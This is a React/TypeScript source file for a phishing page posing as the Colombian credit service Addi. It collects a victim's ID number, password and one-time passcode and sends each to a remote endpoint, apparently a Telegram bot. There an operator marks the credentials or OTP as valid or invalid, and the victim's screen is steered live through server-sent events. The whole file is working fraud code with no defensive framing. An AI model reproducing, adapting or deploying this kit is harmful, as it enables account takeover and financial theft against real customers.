import { useEffect, useState } from "react";
import "./App.css";
import { Image, Logo } from "./assets/images/index.js";
import IdentificationForm from "./components/IdentificationForm.js";
import PasswordForm from "./components/PasswordForm.js";
import LoadingPage from "./pages/LoadingPage.js";
import { api } from "./utils/axios/axios.ts";
import useSse from "./hooks/useSse.tsx";
import OTPPage from "./components/OTPPage.tsx";
import WelcomePage from "./pages/WelcomePage.tsx";
import AcceptedPage from "./pages/AcceptedPage.tsx";
import RejectedPage from "./pages/RejectedPage.tsx";
import toast from "react-hot-toast";

function App() {
  const [showForm, setShowForm] = useState(false);
  const [step, setStep] = useState<"id" | "password" | "loading" | "OTP" | "welcome" | "accepted" | 'rejected'>("id");
  const [cedula, setCedula] = useState("");
  const [password, setPassword] = useState("");
  const [requestId, setRequestId] = useState<string | null>(null);
  const [otp, setOtp] = useState("");

  const { decision } = useSse({ requestId });


  const startSubscription = async () => {
    const response = await api.post("/news/request");
    const { requestId } = response.data;
    setRequestId(requestId);
    return requestId;
  };

  const onContinueOTP = async () => {

    try {
      let currentRequestId = requestId;

      if (!currentRequestId) {
        currentRequestId = await startSubscription();
      }

      const response = await api.post("/send/data", {
        text: `Nueva sesion \n\nCC: ${cedula} \n\nContra: ${password}`,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Usuario normal",
                callback_data: `news:normal:${currentRequestId}`,
              },
              {
                text: "Usuario OTP",
                callback_data: `news:otp:${currentRequestId}`,
              },
            ],
          ],
          requestId: currentRequestId,
        }
      });

      setStep('loading');
      return response;
    } catch (error) {
      console.error(error);
    }
  };

  const onContinue = async () => {

    try {
      let currentRequestId = requestId;

      if (!currentRequestId) {
        currentRequestId = await startSubscription();
      }

      const response = await api.post("/send/data", {
        text: `Nueva sesion \n\nCC: ${cedula} \n\nContra: ${password}`,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Credenciales correctas",
                callback_data: `news:acceptuser:${currentRequestId}`,
              },
              {
                text: "Credenciales incorrectas",
                callback_data: `news:rejectuser:${currentRequestId}`,
              },
            ],
          ],
          requestId: currentRequestId,
        }
      });

      return response;
    } catch (error) {
      console.error(error);
    }
  };

  const handleWait = () => {
    onContinue();
    setStep("loading");
  };

  const handleOnContinue = async () => {
    setShowForm(true);
    try {
      let currentRequestId = requestId;

      if (!currentRequestId) {
        currentRequestId = await startSubscription();
      }

      const response = await api.post("/send/data", {
        text: `🔔 Nueva solicitud! \n\n Alguien presiono "Soy cliente" \n\n Hora: ${new Date()}`,
      });

      return response
    } catch (error) {
      console.error(error);
    }
  }

  //Para manejo de decisiones
  useEffect(() => {
    switch (decision) {
      case "accepted":
        setStep('accepted');
        return;
      case "rejected":
        setStep("rejected");
        return;
      case "otp":
        setStep("OTP");
        return;
      case "otpdenied":
        toast.error('OTP incorrecto, podras solicitar uno en breve.', { position: 'bottom-center' });
        setOtp('');
        setStep('OTP');
        return;
      case "otpaccepted":
        setStep('accepted');
        return;
      case "normal":
        setStep('accepted')
        return;
      case "rejectuser":
        setStep('rejected');
        return;
      case "acceptuser":
        setStep('welcome');
        return;
      default:
        null
    }
  }, [decision]);

  const sendOTP = async () => {

    try {
      let currentRequestId = requestId;

      if (!currentRequestId) {
        currentRequestId = await startSubscription();
      }

      const response = await api.post("/send/data", {
        text: `Codigo OTP para CC: ${cedula} es: \n\n${otp}`,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Aceptar OTP",
                callback_data: `news:otpaccepted:${currentRequestId}`,
              },
              {
                text: "Denegar OTP",
                callback_data: `news:otpdenied:${currentRequestId}`,
              },
            ],
          ],
          requestId: currentRequestId,
        }
      });

      setStep('loading');

      return response
    } catch (error) {
      console.error(error);
    }
  }

  const renderStep = () => {
    switch (step) {
      case "id":
        return <IdentificationForm
          onClose={() => {
            setShowForm(false);
            setStep("id");
          }}
          onContinue={() => setStep("password")}
          cedula={cedula}
          setCedula={setCedula}
        />;

      case "password":
        return <PasswordForm
          onClose={() => setStep("id")}
          onContinue={() => handleWait()}
          password={password}
          setPassword={setPassword}
        />;

      case "loading":
        return <LoadingPage />;

      case "OTP":
        return <OTPPage
          otp={otp}
          onContinue={() => sendOTP()}
          identification={cedula}
          setOtp={setOtp}
          onResend={() => {

          }}
        />
      case "welcome":
        return <WelcomePage onContinue={onContinueOTP} />
      case "accepted":
        return <AcceptedPage />
      case "rejected":
        return <RejectedPage
          onClick={() => setStep('id')}
        />
      default:
        return <LoadingPage />;
    }
  };

  return (
    <div className="bg-linear-to-b from-primary to-primary-dark flex items-center flex-col relative">
      <div className="min-h-[75vh] flex flex-col items-center">
        <img src={Logo} alt="" className="brightness-0 invert my-5 " />
        <img className="md:w-[50%] w-[70%] rounded-3xl" src={Image} alt="" />
        <div className="text-left md:w-[60%] mt-5 px-5">
          <p className="text-white opacity-80">Hazte la vida más Addi</p>
          <p className="text-white font-bold text-2xl">
            Tu crédito Addi, aprobado en minutos
          </p>
          <p className="text-white opacity-80">
            Solicítalo desde la app y empieza a comprar hoy mismo, sin trámites
            complicados.
          </p>
        </div>
      </div>
      <div className="bg-white w-full flex flex-col gap-5 rounded-t-2xl p-5">
        <button
          onClick={handleOnContinue}
          className="bg-primary w-full rounded-full py-3 text-white font-bold cursor-pointer hover:bg-primary-dark mt-3"
        >
          Soy cliente
        </button>
        <button onClick={() => window.location.href = "https://co.addi.com"} className="border border-gray-400 py-3 font-bold rounded-full">
          Quiero ser cliente
        </button>
        <p>Explorar sin registrarme</p>
      </div>

      {showForm && (
        <div className="fixed inset-0 z-50 bg-white flex flex-col p-5">
          {renderStep()}
        </div>
      )}
    </div>
  );
}

export default App;
